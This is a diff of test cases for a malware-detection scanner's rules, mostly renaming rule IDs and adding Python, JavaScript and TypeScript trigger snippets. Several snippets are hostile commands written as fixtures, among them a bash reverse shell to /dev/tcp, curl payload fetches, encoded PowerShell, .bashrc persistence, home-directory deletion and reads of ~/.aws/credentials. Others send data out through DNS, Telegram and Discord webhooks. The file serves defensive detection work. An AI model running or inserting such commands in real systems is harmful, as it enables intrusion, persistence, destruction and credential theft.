@@ -18,462 +18,735 @@ struct Case {
 const CASES: &[Case] = &[
     // Built-in Python rules.
     Case {
-        rule_id: "PY001",
+        rule_id: "chainsec.py.detection.dynamic-code-execution",
         file: "case.py",
         source: "eval(user_input)\n",
     },
     Case {
-        rule_id: "PY002",
+        rule_id: "chainsec.py.detection.decoded-payload",
         file: "case.py",
         source: "import base64\nbase64.b64decode(payload)\n",
     },
     Case {
-        rule_id: "PY003",
+        rule_id: "chainsec.py.detection.process-spawn",
         file: "case.py",
         source: "import os\nos.system(\"ls\")\n",
     },
     Case {
-        rule_id: "PY004",
+        rule_id: "chainsec.py.detection.network-request",
         file: "case.py",
         source: "import requests\nrequests.get(\"https://example.com\")\n",
     },
     Case {
-        rule_id: "PY005",
+        rule_id: "chainsec.py.detection.filesystem-open",
         file: "case.py",
         source: "open(\"data.txt\")\n",
     },
     Case {
-        rule_id: "PY006",
+        rule_id: "chainsec.py.detection.unsafe-deserialization",
         file: "case.py",
         source: "import pickle\npickle.loads(blob)\n",
     },
     // Built-in JavaScript rules.
     Case {
-        rule_id: "JS001",
+        rule_id: "chainsec.js.detection.dynamic-code-execution",
         file: "case.js",
         source: "eval(input);\n",
     },
     Case {
-        rule_id: "JS002",
+        rule_id: "chainsec.js.detection.decoded-payload",
         file: "case.js",
         source: "atob(payload);\n",
     },
     Case {
-        rule_id: "JS003",
+        rule_id: "chainsec.js.detection.process-spawn",
         file: "case.js",
         source: "exec(\"ls\");\n",
     },
     Case {
-        rule_id: "JS004",
+        rule_id: "chainsec.js.detection.network-request",
         file: "case.js",
-        source: "fetch(\"https://example.com\");\n",
+        source: "Deno.listen({ port: 8080 });\n",
     },
     Case {
-        rule_id: "JS005",
+        rule_id: "chainsec.js.detection.read-environment",
         file: "case.js",
-        source: "console.log(process.env.HOME);\n",
+        source: "console.log(process.env.API_TOKEN);\n",
     },
     Case {
-        rule_id: "JS006",
+        rule_id: "chainsec.js.detection.dynamic-require",
         file: "case.js",
         source: "require(moduleName);\n",
     },
     // Built-in TypeScript rules.
     Case {
-        rule_id: "TS001",
+        rule_id: "chainsec.ts.detection.dynamic-code-execution",
         file: "case.ts",
         source: "eval(input);\n",
     },
     Case {
-        rule_id: "TS002",
+        rule_id: "chainsec.ts.detection.decoded-payload",
         file: "case.ts",
         source: "atob(payload);\n",
     },
     Case {
-        rule_id: "TS003",
+        rule_id: "chainsec.ts.detection.process-spawn",
         file: "case.ts",
-        source: "spawn(\"ls\");\n",
+        source: "new Deno.Command(\"ls\").output();\n",
     },
     Case {
-        rule_id: "TS004",
+        rule_id: "chainsec.ts.detection.network-request",
         file: "case.ts",
-        source: "fetch(\"https://example.com\");\n",
+        source: "Deno.serveHttp(connection);\n",
     },
     Case {
-        rule_id: "TS005",
+        rule_id: "chainsec.ts.detection.read-environment",
         file: "case.ts",
-        source: "console.log(process.env.HOME);\n",
+        source: "Deno.env.get(\"API_TOKEN\");\n",
+    },
+    // Built-in obfuscation heuristics.
+    Case {
+        rule_id: "chainsec.py.detection.character-assembly",
+        file: "case.py",
+        source: "decoded = \"\".join([chr(ord(a)), chr(ord(b)), chr(ord(c)), chr(ord(d)), chr(ord(e)), chr(ord(f)), chr(ord(g)), chr(ord(h))])\n",
+    },
+    Case {
+        rule_id: "chainsec.py.detection.encoded-escapes",
+        file: "case.py",
+        source: "payload = \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\njoined = \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\" + \"\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\n",
+    },
+    Case {
+        rule_id: "chainsec.py.detection.ambiguous-identifier",
+        file: "case.py",
+        source: "_0x1d8f = payload\n",
+    },
+    Case {
+        rule_id: "chainsec.py.detection.reflective-namespace",
+        file: "case.py",
+        source: "loader = handler.__globals__[\"__builtins__\"][\"__import__\"]\nnamespace = getattr(handler, \"__globals__\")\nsetattr(handler, \"__loader__\", loader)\n",
+    },
+    Case {
+        rule_id: "chainsec.js.detection.character-code-assembly",
+        file: "case.js",
+        source: "const decoded = [65, 66, 67, 68, 69, 70, 71, 72].map((code) => String.fromCharCode(code)).join(\"\");\n",
+    },
+    Case {
+        rule_id: "chainsec.js.detection.encoded-escapes",
+        file: "case.js",
+        source: "const payload = \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\";\nconst joined = \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\" + \"\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\";\n",
+    },
+    Case {
+        rule_id: "chainsec.js.detection.ambiguous-identifier",
+        file: "case.js",
+        source: "const OO0O0O = payload;\n",
+    },
+    Case {
+        rule_id: "chainsec.js.detection.write-browser-global",
+        file: "case.js",
+        source: "window[\"sessionKey\"] = token;\n",
+    },
+    Case {
+        rule_id: "chainsec.ts.detection.character-code-assembly",
+        file: "case.ts",
+        source: "const decoded = [65, 66, 67, 68, 69, 70, 71, 72].map((code) => String.fromCharCode(code)).join(\"\");\n",
+    },
+    Case {
+        rule_id: "chainsec.ts.detection.encoded-escapes",
+        file: "case.ts",
+        source: "const payload = \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\";\nconst joined = \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\" + \"\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\";\n",
+    },
+    Case {
+        rule_id: "chainsec.ts.detection.ambiguous-identifier",
+        file: "case.ts",
+        source: "const OO0O0O = payload;\n",
+    },
+    Case {
+        rule_id: "chainsec.ts.detection.write-browser-global",
+        file: "case.ts",
+        source: "window.sessionKey = token;\n",
     },
     // High-entropy string rules.
     Case {
-        rule_id: "PY_HIGH_ENTROPY_STRING",
+        rule_id: "chainsec.py.detection.heuristic.high-entropy-string",
         file: "case.py",
         source: "token = \"aZ8xK2vQ9wN4rT7yU1iO5pL3sD6fG0hJ9kM2nB8vC4xZ\"\n",
     },
     Case {
-        rule_id: "JS_HIGH_ENTROPY_STRING",
+        rule_id: "chainsec.js.detection.heuristic.high-entropy-string",
         file: "case.js",
         source: "const token = \"aZ8xK2vQ9wN4rT7yU1iO5pL3sD6fG0hJ9kM2nB8vC4xZ\";\n",
     },
     Case {
-        rule_id: "TS_HIGH_ENTROPY_STRING",
+        rule_id: "chainsec.ts.detection.heuristic.high-entropy-string",
         file: "case.ts",
         source: "const token = \"aZ8xK2vQ9wN4rT7yU1iO5pL3sD6fG0hJ9kM2nB8vC4xZ\";\n",
     },
+    // Semantic obfuscation and dynamic-execution rules.
+    Case {
+        rule_id: "chainsec.js.detection.heuristic.dynamic-code-execution",
+        file: "case.js",
+        source: "globalThis['eval'](payload);\n",
+    },
+    Case {
+        rule_id: "chainsec.ts.detection.heuristic.dynamic-code-execution",
+        file: "case.ts",
+        source: "setTimeout('payload()', 0);\n",
+    },
+    Case {
+        rule_id: "chainsec.js.detection.heuristic.string-table",
+        file: "case.js",
+        source: "const table = ['a','b','c','d','e','f','g','h','i','j'];\nfunction decode(i) { return table[i]; }\n",
+    },
+    Case {
+        rule_id: "chainsec.ts.detection.heuristic.string-table",
+        file: "case.ts",
+        source: "const table = ['a','b','c','d','e','f','g','h','i','j'];\nfunction decode(i) { return table[i]; }\n",
+    },
+    Case {
+        rule_id: "chainsec.js.detection.heuristic.control-flow-flattening",
+        file: "case.js",
+        source: "while (cursor < order.length) { switch (order[cursor++]) { case '0': run(); break; } }\n",
+    },
+    Case {
+        rule_id: "chainsec.ts.detection.heuristic.control-flow-flattening",
+        file: "case.ts",
+        source: "while (cursor < order.length) { switch (order[cursor++]) { case '0': run(); break; } }\n",
+    },
+    Case {
+        rule_id: "chainsec.js.detection.heuristic.rc4-decoder",
+        file: "case.js",
+        source: "const state = Array(256); const key = input.charCodeAt(0); const result = String.fromCharCode(key ^ (state[0] % 256));\n",
+    },
+    Case {
+        rule_id: "chainsec.ts.detection.heuristic.rc4-decoder",
+        file: "case.ts",
+        source: "const state = Array(256); const key = input.charCodeAt(0); const result = String.fromCharCode(key ^ (state[0] % 256));\n",
+    },
+    Case {
+        rule_id: "chainsec.js.detection.heuristic.embedded-vm",
+        file: "case.js",
+        source: "const bytecode = new Uint8Array(data); let opcode = bytecode[0]; while (opcode) { switch (opcode) { case 1: dispatch(); } }\n",
+    },
+    Case {
+        rule_id: "chainsec.ts.detection.heuristic.embedded-vm",
+        file: "case.ts",
+        source: "const bytecode = new Uint8Array(data); let opcode = bytecode[0]; while (opcode) { switch (opcode) { case 1: dispatch(); } }\n",
+    },
+    Case {
+        rule_id: "chainsec.py.detection.heuristic.opaque-execution-input",
+        file: "case.py",
+        source: "import marshal\nexec(marshal.loads(blob))\n",
+    },
+    Case {
+        rule_id: "chainsec.py.detection.heuristic.dynamic-module",
+        file: "case.py",
+        source: "import importlib\nmodule = importlib.import_module(name)\n",
+    },
+    Case {
+        rule_id: "chainsec.py.detection.heuristic.code-protector-marker",
+        file: "case.py",
+        source: "from pyarmor_runtime import __pyarmor__\n",
+    },
+    Case {
+        rule_id: "chainsec.ts.detection.dynamic-require",
+        file: "case.ts",
+        source: "require(moduleName);\n",
+    },
     // GuardDog capability rules (Python).
     Case {
-        rule_id: "GD_CAPABILITY_FILESYSTEM_BROWSER_PY",
+        rule_id: "chainsec.py.capability.secret-read-browser-profile",
         file: "case.py",
         source: "path = \"~/Library/Safari/LocalStorage\"\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_FILESYSTEM_DELETE_PY",
+        rule_id: "chainsec.py.capability.filesystem-delete",
         file: "case.py",
         source: "import shutil\nshutil.rmtree(\"/tmp/stale\")\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_FILESYSTEM_READ_PY",
+        rule_id: "chainsec.py.capability.filesystem-read",
         file: "case.py",
         source: "from pathlib import Path\nPath(\"data.txt\").read_text()\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_FILESYSTEM_WRITE_EXECUTABLE_PY",
+        rule_id: "chainsec.py.capability.filesystem-set-permissions",
         file: "case.py",
         source: "import os\nos.chmod(\"tool.sh\", 0o755)\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_NETWORK_DOWNLOAD_PY",
+        rule_id: "chainsec.py.capability.filesystem-write",
+        file: "case.py",
+        source: "open(\"data.txt\", \"w\")\n",
+    },
+    Case {
+        rule_id: "chainsec.py.capability.network-listen",
+        file: "case.py",
+        source: "server.listen()\n",
+    },
+    Case {
+        rule_id: "chainsec.py.capability.network-raw-socket",
+        file: "case.py",
+        source: "import socket\nsocket.socket(socket.AF_INET, socket.SOCK_RAW)\n",
+    },
+    Case {
+        rule_id: "chainsec.py.capability.network-download",
         file: "case.py",
         source: "import wget\nwget.download(\"https://example.com/f.bin\")\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_NETWORK_OUTBOUND_PY",
+        rule_id: "chainsec.py.capability.network-connect",
         file: "case.py",
-        source: "import urllib.request\nurllib.request.urlopen(\"https://example.com\")\n",
+        source: "import socket\nsock = socket.socket()\nsock.connect((\"example.com\", 443))\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_NETWORK_LOLBAS_PY",
+        rule_id: "chainsec.py.capability.network-tls",
+        file: "case.py",
+        source: "import ssl\nssl_context = ssl.create_default_context()\nssl_context.wrap_socket(sock, server_hostname=\"example.com\")\n",
+    },
+    Case {
+        rule_id: "chainsec.py.capability.network-connect-via-lolbas",
         file: "case.py",
         source: "import os\nos.system(\"curl https://example.com/payload\")\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_PROCESS_SCHEDULE_PY",
+        rule_id: "chainsec.py.capability.process-schedule",
         file: "case.py",
         source: "from crontab import CronTab\nCronTab(user=\"root\")\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_PROCESS_SPAWN_PY",
+        rule_id: "chainsec.py.capability.process-spawn",
         file: "case.py",
         source: "import os\nos.spawnl(os.P_NOWAIT, \"/bin/ls\")\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_RUNTIME_CLIPBOARD_PY",
+        rule_id: "chainsec.py.capability.dynamic-code-execution",
+        file: "case.py",
+        source: "eval(payload)\n",
+    },
+    Case {
+        rule_id: "chainsec.py.capability.clipboard-access",
         file: "case.py",
         source: "import pyperclip\npyperclip.paste()\n",
     },
     // GuardDog capability rules (JavaScript/TypeScript share queries).
     Case {
-        rule_id: "GD_CAPABILITY_FILESYSTEM_BROWSER_JS",
+        rule_id: "chainsec.js.capability.secret-read-browser-profile",
         file: "case.js",
         source: "const store = \"chrome-cookies-secure\";\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_FILESYSTEM_BROWSER_TS",
+        rule_id: "chainsec.ts.capability.secret-read-browser-profile",
         file: "case.ts",
         source: "const store = \"chrome-cookies-secure\";\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_FILESYSTEM_DELETE_JS",
+        rule_id: "chainsec.js.capability.filesystem-delete",
         file: "case.js",
         source: "fs.rmSync(\"/tmp/stale\", { recursive: true });\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_FILESYSTEM_DELETE_TS",
+        rule_id: "chainsec.ts.capability.filesystem-delete",
         file: "case.ts",
-        source: "fs.rmSync(\"/tmp/stale\", { recursive: true });\n",
+        source: "Deno.remove(\"/tmp/stale\", { recursive: true });\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_FILESYSTEM_READ_JS",
+        rule_id: "chainsec.js.capability.filesystem-read",
         file: "case.js",
         source: "fs.readFileSync(\"data.txt\");\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_FILESYSTEM_READ_TS",
+        rule_id: "chainsec.ts.capability.filesystem-read",
         file: "case.ts",
-        source: "fs.readFileSync(\"data.txt\");\n",
+        source: "Deno.readTextFile(\"data.txt\");\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_FILESYSTEM_WRITE_EXECUTABLE_JS",
+        rule_id: "chainsec.js.capability.filesystem-set-permissions",
         file: "case.js",
         source: "fs.chmodSync(\"tool.sh\", 0o755);\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_FILESYSTEM_WRITE_EXECUTABLE_TS",
+        rule_id: "chainsec.ts.capability.filesystem-set-permissions",
         file: "case.ts",
-        source: "fs.chmodSync(\"tool.sh\", 0o755);\n",
+        source: "Deno.chmod(\"tool.sh\", 0o755);\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_NETWORK_DOWNLOAD_JS",
+        rule_id: "chainsec.js.capability.filesystem-write",
+        file: "case.js",
+        source: "fs.writeFileSync(\"data.txt\", \"content\");\n",
+    },
+    Case {
+        rule_id: "chainsec.ts.capability.filesystem-write",
+        file: "case.ts",
+        source: "Deno.writeTextFile(\"data.txt\", \"content\");\n",
+    },
+    Case {
+        rule_id: "chainsec.js.capability.network-listen",
+        file: "case.js",
+        source: "http.createServer(handler);\n",
+    },
+    Case {
+        rule_id: "chainsec.ts.capability.network-listen",
+        file: "case.ts",
+        source: "http.createServer(handler);\n",
+    },
+    Case {
+        rule_id: "chainsec.js.capability.network-raw-socket",
+        file: "case.js",
+        source: "require(\"raw-socket\");\n",
+    },
+    Case {
+        rule_id: "chainsec.ts.capability.network-raw-socket",
+        file: "case.ts",
+        source: "import raw from \"raw-socket\";\n",
+    },
+    Case {
+        rule_id: "chainsec.js.capability.network-download",
         file: "case.js",
         source: "got(\"https://example.com/f.bin\");\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_NETWORK_DOWNLOAD_TS",
+        rule_id: "chainsec.ts.capability.network-download",
         file: "case.ts",
         source: "got(\"https://example.com/f.bin\");\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_NETWORK_OUTBOUND_JS",
+        rule_id: "chainsec.js.capability.network-connect",
         file: "case.js",
         source: "dns.lookup(\"example.com\");\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_NETWORK_OUTBOUND_TS",
+        rule_id: "chainsec.ts.capability.network-connect",
         file: "case.ts",
-        source: "dns.lookup(\"example.com\");\n",
+        source: "Deno.connect({ hostname: \"example.com\", port: 443 });\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_NETWORK_LOLBAS_JS",
+        rule_id: "chainsec.js.capability.network-tls",
+        file: "case.js",
+        source: "tls.connect(443, \"example.com\");\n",
+    },
+    Case {
+        rule_id: "chainsec.ts.capability.network-tls",
+        file: "case.ts",
+        source: "Deno.connectTls({ hostname: \"example.com\", port: 443 });\n",
+    },
+    Case {
+        rule_id: "chainsec.js.capability.network-connect-via-lolbas",
         file: "case.js",
         source: "exec(\"curl https://example.com/payload\");\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_NETWORK_LOLBAS_TS",
+        rule_id: "chainsec.ts.capability.network-connect-via-lolbas",
         file: "case.ts",
         source: "exec(\"curl https://example.com/payload\");\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_PROCESS_SCHEDULE_JS",
+        rule_id: "chainsec.js.capability.process-schedule",
         file: "case.js",
         source: "const cron = require(\"node-cron\");\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_PROCESS_SCHEDULE_TS",
+        rule_id: "chainsec.ts.capability.process-schedule",
         file: "case.ts",
         source: "import cron from \"node-cron\";\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_PROCESS_SPAWN_JS",
+        rule_id: "chainsec.js.capability.process-spawn",
         file: "case.js",
         source: "child_process.execSync(\"ls\");\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_PROCESS_SPAWN_TS",
+        rule_id: "chainsec.ts.capability.process-spawn",
         file: "case.ts",
-        source: "child_process.execSync(\"ls\");\n",
+        source: "new Deno.Command(\"ls\").output();\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_RUNTIME_CLIPBOARD_JS",
+        rule_id: "chainsec.js.capability.dynamic-code-execution",
+        file: "case.js",
+        source: "eval(payload);\n",
+    },
+    Case {
+        rule_id: "chainsec.ts.capability.dynamic-code-execution",
+        file: "case.ts",
+        source: "eval(payload);\n",
+    },
+    Case {
+        rule_id: "chainsec.js.capability.clipboard-access",
         file: "case.js",
         source: "clipboardy.readSync();\n",
     },
     Case {
-        rule_id: "GD_CAPABILITY_RUNTIME_CLIPBOARD_TS",
+        rule_id: "chainsec.ts.capability.clipboard-access",
         file: "case.ts",
         source: "clipboardy.readSync();\n",
+    },
+    // Additional capability rules.
+    Case {
+        rule_id: "chainsec.py.capability.secret-read-environment",
+        file: "case.py",
+        source: "os.getenv(\"TOKEN\")\n",
+    },
+    Case {
+        rule_id: "chainsec.js.capability.secret-read-environment",
+        file: "case.js",
+        source: "process.env.TOKEN;\n",
+    },
+    Case {
+        rule_id: "chainsec.ts.capability.secret-read-environment",
+        file: "case.ts",
+        source: "Deno.env.get(\"TOKEN\");\n",
+    },
+    Case {
+        rule_id: "chainsec.py.capability.secret-read-file",
+        file: "case.py",
+        source: "path = \"~/.aws/credentials\"\n",
+    },
+    Case {
+        rule_id: "chainsec.js.capability.secret-read-file",
+        file: "case.js",
+        source: "const path = \"~/.aws/credentials\";\n",
+    },
+    Case {
+        rule_id: "chainsec.ts.capability.secret-read-file",
+        file: "case.ts",
+        source: "const path = \"~/.aws/credentials\";\n",
+    },
+    Case {
+        rule_id: "chainsec.py.capability.filesystem-enumerate",
+        file: "case.py",
+        source: "os.listdir(\".\")\n",
+    },
+    Case {
+        rule_id: "chainsec.js.capability.filesystem-enumerate",
+        file: "case.js",
+        source: "fs.readdirSync(\".\");\n",
+    },
+    Case {
+        rule_id: "chainsec.ts.capability.filesystem-enumerate",
+        file: "case.ts",
+        source: "fs.readdirSync(\".\");\n",
+    },
+    Case {
+        rule_id: "chainsec.py.capability.filesystem-archive",
+        file: "case.py",
+        source: "archive.extractall(path)\n",
+    },
+    Case {
+        rule_id: "chainsec.js.capability.filesystem-archive",
+        file: "case.js",
+        source: "archive.extractAll(path);\n",
+    },
+    Case {
+        rule_id: "chainsec.ts.capability.filesystem-archive",
+        file: "case.ts",
+        source: "archive.extractAll(path);\n",
+    },
+    Case {
+        rule_id: "chainsec.py.capability.network-resolve-dns",
+        file: "case.py",
+        source: "socket.gethostbyname(\"example.com\")\n",
+    },
+    Case {
+        rule_id: "chainsec.js.capability.network-resolve-dns",
+        file: "case.js",
+        source: "dns.lookup(\"example.com\");\n",
+    },
+    Case {
+        rule_id: "chainsec.ts.capability.network-resolve-dns",
+        file: "case.ts",
+        source: "dns.lookup(\"example.com\");\n",
     },
     // GuardDog threat rules (Python).
     Case {
-        rule_id: "GD_THREAT_FILESYSTEM_AUTOSTART_PY",
+        rule_id: "chainsec.py.detection.guarddog.autostart",
         file: "case.py",
         source: "open(\"/home/user/.bashrc\", \"a\")\n",
     },
     Case {
-        rule_id: "GD_THREAT_FILESYSTEM_DESTRUCTION_PY",
+        rule_id: "chainsec.py.detection.guarddog.destructive-deletion",
         file: "case.py",
         source: "import shutil\nshutil.rmtree(\"/home/user\")\n",
     },
     Case {
-        rule_id: "GD_THREAT_NETWORK_DNS_EXFIL_PY",
+        rule_id: "chainsec.py.detection.guarddog.dns-exfiltration",
         file: "case.py",
         source: "import socket\nsocket.gethostbyname(secret + \".example.com\")\n",
     },
     Case {
-        rule_id: "GD_THREAT_NETWORK_EXFIL_MESSENGER_PY",
+        rule_id: "chainsec.py.detection.guarddog.messenger-exfiltration",
         file: "case.py",
         source: "url = \"https://api.telegram.org/bot123456:AAH8fK2vQ9wN4rT7yU1iO5pL3sD6fG0hJ9k/sendMessage\"\n",
     },
     Case {
-        rule_id: "GD_THREAT_NETWORK_OUTBOUND_SHADY_LINKS_PY",
+        rule_id: "chainsec.py.detection.guarddog.suspicious-network-destination",
         file: "case.py",
         source: "callback = \"https://webhook.site/abc-def\"\n",
     },
     Case {
-        rule_id: "GD_THREAT_NETWORK_REVERSE_SHELL_PY",
+        rule_id: "chainsec.py.detection.guarddog.reverse-shell",
         file: "case.py",
         source: "import os\nos.system(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\")\n",
     },
     Case {
-        rule_id: "GD_THREAT_PROCESS_CRYPTOMINING_PY",
+        rule_id: "chainsec.py.detection.guarddog.cryptomining",
         file: "case.py",
         source: "miner = \"xmrig\"\n",
     },
     Case {
-        rule_id: "GD_THREAT_PROCESS_DOWNLOAD_EXEC_PY",
+        rule_id: "chainsec.py.detection.guarddog.download-and-execute",
         file: "case.py",
         source: "import os\nos.system(\"pip install evil-package\")\n",
     },
     Case {
-        rule_id: "GD_THREAT_PROCESS_POWERSHELL_ENCODED_PY",
+        rule_id: "chainsec.py.detection.guarddog.encoded-powershell",
         file: "case.py",
         source: "import os\nos.system(\"powershell -EncodedCommand SQBFAFgAIAAoACcAAG4AZQB3AC0A\")\n",
     },
     Case {
-        rule_id: "GD_THREAT_RUNTIME_OBFUSCATION_BASE64EXEC_PY",
+        rule_id: "chainsec.py.detection.guarddog.base64-decoded-execution",
         file: "case.py",
         source: "import base64\nexec(base64.b64decode(blob))\n",
     },
     Case {
-        rule_id: "GD_THREAT_RUNTIME_OBFUSCATION_IMPORT_EXEC_PY",
+        rule_id: "chainsec.py.detection.guarddog.dynamic-import",
         file: "case.py",
         source: "exec(__import__(\"os\"))\n",
     },
     Case {
-        rule_id: "GD_THREAT_RUNTIME_OBFUSCATION_API_PY",
+        rule_id: "chainsec.py.detection.guarddog.reflective-api",
         file: "case.py",
         source: "getattr(mod, \"exec\")(\"code\")\n",
     },
     Case {
-        rule_id: "GD_THREAT_RUNTIME_OBFUSCATION_PYARMOR_PY",
+        rule_id: "chainsec.py.detection.guarddog.pyarmor",
         file: "case.py",
         source: "__pyarmor__(__name__, __file__, b'payload')\n",
     },
     Case {
-        rule_id: "GD_THREAT_RUNTIME_SCREENCAPTURE_PY",
+        rule_id: "chainsec.py.detection.guarddog.screen-capture",
         file: "case.py",
         source: "import pyautogui\npyautogui.screenshot()\n",
     },
     Case {
-        rule_id: "GD_THREAT_RUNTIME_ENVIRONMENT_READ_PY",
+        rule_id: "chainsec.py.detection.guarddog.credential-environment",
         file: "case.py",
         source: "import os\nos.getenv(\"AWS_SECRET_ACCESS_KEY\")\n",
     },
     // GuardDog threat rules (JavaScript/TypeScript share queries).
     Case {
-        rule_id: "GD_THREAT_FILESYSTEM_AUTOSTART_JS",
+        rule_id: "chainsec.js.detection.guarddog.autostart",
         file: "case.js",
         source: "fs.appendFileSync(\"/home/user/.bashrc\", \"payload\");\n",
     },
     Case {
-        rule_id: "GD_THREAT_FILESYSTEM_AUTOSTART_TS",
+        rule_id: "chainsec.ts.detection.guarddog.autostart",
         file: "case.ts",
         source: "fs.appendFileSync(\"/home/user/.bashrc\", \"payload\");\n",
     },
     Case {
-        rule_id: "GD_THREAT_FILESYSTEM_DESTRUCTION_JS",
+        rule_id: "chainsec.js.detection.guarddog.destructive-deletion",
         file: "case.js",
         source: "rimraf(\"/home/user\");\n",
     },
     Case {
-        rule_id: "GD_THREAT_FILESYSTEM_DESTRUCTION_TS",
+        rule_id: "chainsec.ts.detection.guarddog.destructive-deletion",
         file: "case.ts",
         source: "rimraf(\"/home/user\");\n",
     },
     Case {
-        rule_id: "GD_THREAT_NETWORK_EXFIL_MESSENGER_JS",
+        rule_id: "chainsec.js.detection.guarddog.messenger-exfiltration",
         file: "case.js",
         source: "const url = \"https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz\";\n",
     },
     Case {
-        rule_id: "GD_THREAT_NETWORK_EXFIL_MESSENGER_TS",
+        rule_id: "chainsec.ts.detection.guarddog.messenger-exfiltration",
         file: "case.ts",
         source: "const url = \"https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz\";\n",
     },
     Case {
-        rule_id: "GD_THREAT_NETWORK_OUTBOUND_SHADY_LINKS_JS",
+        rule_id: "chainsec.js.detection.guarddog.suspicious-network-destination",
         file: "case.js",
         source: "const callback = \"https://ngrok.io/tunnel\";\n",
     },
     Case {
-        rule_id: "GD_THREAT_NETWORK_OUTBOUND_SHADY_LINKS_TS",
+        rule_id: "chainsec.ts.detection.guarddog.suspicious-network-destination",
         file: "case.ts",
         source: "const callback = \"https://ngrok.io/tunnel\";\n",
     },
     Case {
-        rule_id: "GD_THREAT_NETWORK_REVERSE_SHELL_JS",
+        rule_id: "chainsec.js.detection.guarddog.reverse-shell",
         file: "case.js",
         source: "exec(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\");\n",
     },
     Case {
-        rule_id: "GD_THREAT_NETWORK_REVERSE_SHELL_TS",
+        rule_id: "chainsec.ts.detection.guarddog.reverse-shell",
         file: "case.ts",
         source: "exec(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\");\n",
     },
     Case {
-        rule_id: "GD_THREAT_PROCESS_CRYPTOMINING_JS",
+        rule_id: "chainsec.js.detection.guarddog.cryptomining",
         file: "case.js",
         source: "const miner = \"xmrig\";\n",
     },
     Case {
-        rule_id: "GD_THREAT_PROCESS_CRYPTOMINING_TS",
+        rule_id: "chainsec.ts.detection.guarddog.cryptomining",
         file: "case.ts",
         source: "const miner = \"xmrig\";\n",
     },
     Case {
-        rule_id: "GD_THREAT_PROCESS_DOWNLOAD_EXEC_JS",
+        rule_id: "chainsec.js.detection.guarddog.download-and-execute",
         file: "case.js",
         source: "exec(\"npm install evil-package\");\n",
     },
     Case {
-        rule_id: "GD_THREAT_PROCESS_DOWNLOAD_EXEC_TS",
+        rule_id: "chainsec.ts.detection.guarddog.download-and-execute",
         file: "case.ts",
         source: "exec(\"npm install evil-package\");\n",
     },
     Case {
-        rule_id: "GD_THREAT_PROCESS_POWERSHELL_ENCODED_JS",
+        rule_id: "chainsec.js.detection.guarddog.encoded-powershell",
         file: "case.js",
         source: "exec(\"powershell -EncodedCommand SQBFAFgAIAAoACcAAG4AZQB3AC0A\");\n",
     },
     Case {
-        rule_id: "GD_THREAT_PROCESS_POWERSHELL_ENCODED_TS",
+        rule_id: "chainsec.ts.detection.guarddog.encoded-powershell",
         file: "case.ts",
         source: "exec(\"powershell -EncodedCommand SQBFAFgAIAAoACcAAG4AZQB3AC0A\");\n",
     },
     Case {
-        rule_id: "GD_THREAT_RUNTIME_OBFUSCATION_BASE64EXEC_JS",
+        rule_id: "chainsec.js.detection.guarddog.base64-decoded-execution",
         file: "case.js",
         source: "eval(atob(payload));\n",
     },
     Case {
-        rule_id: "GD_THREAT_RUNTIME_OBFUSCATION_BASE64EXEC_TS",
+        rule_id: "chainsec.ts.detection.guarddog.base64-decoded-execution",
         file: "case.ts",
         source: "eval(atob(payload));\n",
     },
     Case {
-        rule_id: "GD_THREAT_RUNTIME_OBFUSCATION_API_JS",
+        rule_id: "chainsec.js.detection.guarddog.reflective-api",
         file: "case.js",
         source: "Object.getOwnPropertyDescriptor(mod, \"run\").value();\n",
     },
     Case {
-        rule_id: "GD_THREAT_RUNTIME_OBFUSCATION_API_TS",
+        rule_id: "chainsec.ts.detection.guarddog.reflective-api",
         file: "case.ts",
         source: "Object.getOwnPropertyDescriptor(mod, \"run\").value();\n",
     },
     Case {
-        rule_id: "GD_THREAT_RUNTIME_OBFUSCATION_HIDDEN_CODE_JS",
+        rule_id: "chainsec.js.detection.guarddog.hidden-require",
         file: "case.js",
         source: "global[\"rq\"] = require;\n",
     },
     Case {
-        rule_id: "GD_THREAT_RUNTIME_OBFUSCATION_HIDDEN_CODE_TS",
+        rule_id: "chainsec.ts.detection.guarddog.hidden-require",
         file: "case.ts",
         source: "global[\"rq\"] = require;\n",
-    },
-    Case {
